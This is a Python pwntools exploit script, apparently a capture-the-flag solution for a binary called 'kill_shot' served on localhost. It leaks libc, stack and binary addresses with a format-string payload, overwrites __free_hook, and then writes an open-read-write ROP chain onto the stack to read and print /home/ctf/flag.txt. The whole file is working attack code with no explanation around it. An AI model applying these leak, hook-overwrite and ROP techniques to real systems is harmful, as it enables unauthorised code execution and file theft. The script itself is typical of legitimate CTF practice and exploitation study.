from pwn import *
import time

# p = process('kill_shot')
p = remote('localhost', 7777)
e = ELF('kill_shot')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p.sendlineafter('Format: ', '%25$p.%6$p.%21$p')
leaks = p.recvline()[:-1].decode().split('.')
libc.address = int(leaks[0], 16) - 243 - libc.symbols['__libc_start_main']
stack = int(leaks[1], 16) - 0xf0 + 0x8
e.address = int(leaks[2], 16) - 0xb10
print(hex(libc.address))
print(hex(stack))
print(hex(e.address))

pop_rdi = libc.address + 0x0000000000026b72 
pop_rsi = libc.address + 0x0000000000027529
pop_rdx_r12 = libc.address + 0x000000000011c371
bss = e.bss(0x500)

p.sendlineafter('Pointer: ', str(libc.symbols['__free_hook']))
p.sendlineafter('Content: ', pack(e.symbols['kill'], 64))

def add(size, s):
    p.sendlineafter('exit\n', '1')
    p.sendlineafter('Size: ', str(size))
    p.sendlineafter('Data: ', s)

def delete(i): 
    p.sendlineafter('exit\n', '2')
    p.sendlineafter('Index: ', str(i))

def kill(s):
    global stack
    add(10, '')
    delete(1)
    p.sendlineafter('Pointer: ', str(stack))
    p.sendlineafter('Content: ', s)
    stack += 0x8

add(10, '')

# read(0, bss, 0x100)
kill(pack(pop_rdi, 64))
kill(pack(0, 64))
kill(pack(pop_rsi, 64))
kill(pack(bss, 64))
kill(pack(pop_rdx_r12, 64))
kill(pack(0x100, 64))
kill(pack(0, 64))
kill(pack(libc.symbols['read'], 64))

# openat(0, bss, 0)
kill(pack(pop_rdi, 64))
kill(pack(0, 64))
kill(pack(pop_rsi, 64))
kill(pack(bss, 64))
kill(pack(pop_rdx_r12, 64))
kill(pack(0, 64))
kill(pack(0, 64))
kill(pack(libc.symbols['openat'], 64))

# open(bss, 0)
# kill(pack(pop_rdi, 64))
# kill(pack(bss, 64))
# kill(pack(pop_rsi, 64))
# kill(pack(0, 64))
# kill(pack(libc.symbols['open'], 64))

# read(5, bss, 0x100)
kill(pack(pop_rdi, 64))
kill(pack(5, 64))
kill(pack(pop_rsi, 64))
kill(pack(bss, 64))
kill(pack(pop_rdx_r12, 64))
kill(pack(0x100, 64))
kill(pack(0, 64))
kill(pack(libc.symbols['read'], 64))

# write(1, bss, 0x100)
kill(pack(pop_rdi, 64))
kill(pack(1, 64))
kill(pack(pop_rsi, 64))
kill(pack(bss, 64))
kill(pack(pop_rdx_r12, 64))
kill(pack(0x100, 64))
kill(pack(0, 64))
kill(pack(libc.symbols['write'], 64))


p.sendline('3')

time.sleep(1)

p.sendline('/home/ctf/flag.txt\x00')

time.sleep(1)

p.interactive()
